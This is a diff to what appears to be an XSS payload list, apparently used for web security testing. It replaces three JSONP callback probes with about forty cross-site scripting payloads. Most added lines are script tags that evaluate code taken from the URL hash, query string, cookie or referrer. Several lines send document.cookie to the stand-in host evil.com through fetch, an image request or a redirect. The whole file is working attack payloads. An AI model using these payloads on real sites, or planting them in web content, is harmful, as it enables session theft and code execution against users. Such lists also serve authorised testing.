@@ -1,3 +1,41 @@
-?callback=alert(1)
-?jsonp=alert(1)
-?cb=alert(document.domain)
+<script>eval(location.hash.slice(1))</script>
+<script>eval(decodeURIComponent(location.hash.slice(1)))</script>
+<script>eval(unescape(location.hash.slice(1)))</script>
+<script>eval(atob(location.hash.slice(1)))</script>
+<script>eval(location.search.slice(1))</script>
+<script>eval(new URLSearchParams(location.search).get('c'))</script>
+<script>eval(document.cookie)</script>
+<script>eval(document.referrer)</script>
+<script>window.eval(location.hash.slice(1))</script>
+<script>Function(location.hash.slice(1))()</script>
+<script>new Function(location.hash.slice(1))()</script>
+<script>setTimeout(location.hash.slice(1),0)</script>
+<script>setInterval(location.hash.slice(1),1)</script>
+<script>setImmediate(location.hash.slice(1))</script>
+<script>execScript(location.hash.slice(1))</script>
+<script>ScriptElement=document.createElement('script');ScriptElement.innerText=location.hash.slice(1);document.head.appendChild(ScriptElement);</script>
+<script>var s=document.createElement('script');s.src='data:text/javascript,'+location.hash.slice(1);document.body.appendChild(s);</script>
+<script>var s=document.createElement('script');s.innerHTML=location.hash.slice(1);document.body.appendChild(s);</script>
+<script>import(location.hash.slice(1))</script>
+<script>System.import(location.hash.slice(1))</script>
+<script>require(location.hash.slice(1))</script>
+alert(1)
+alert(document.cookie)
+alert(window.origin)
+fetch('//evil.com/?c='+document.cookie)
+new Image().src='//evil.com/?c='+document.cookie
+document.location='//evil.com/?c='+document.cookie
+window.location='//evil.com/?c='+document.cookie
+location='javascript:alert(1)'
+window.onload=function(){alert(1)}
+(function(){alert(1)})()
+!function(){alert(1)}()
++function(){alert(1)}()
+-function(){alert(1)}()
+~function(){alert(1)}()
+void function(){alert(1)}()
+;alert(1)//
+
+alert(1)//
+alert`1`
+[].constructor.constructor('alert(1)')()
